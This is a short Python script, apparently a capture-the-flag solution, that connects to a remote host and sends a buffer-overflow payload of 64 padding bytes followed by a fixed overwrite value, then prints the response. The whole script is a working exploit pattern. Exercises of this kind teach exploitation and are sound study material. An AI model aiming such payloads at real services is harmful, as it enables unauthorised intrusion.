#urg their nc is broken af

import socket

HOST = "104.236.80.67"
PORT = 5681
Payload = "A"*64 + "\x37\x13\x37\x13\n"

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.sendall(Payload)
    print sock.recv(1024)
    #print sock.recv(1024)
    #print sock.recv(1024)
    sock.close()

main()
